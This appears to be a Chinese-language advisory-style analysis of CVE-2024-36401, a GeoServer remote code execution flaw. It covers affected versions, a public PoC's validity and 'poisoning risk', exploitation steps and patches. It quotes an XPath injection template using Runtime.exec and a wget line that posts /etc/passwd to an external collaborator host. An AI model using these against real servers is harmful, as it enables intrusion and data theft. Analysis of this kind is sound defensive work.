## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)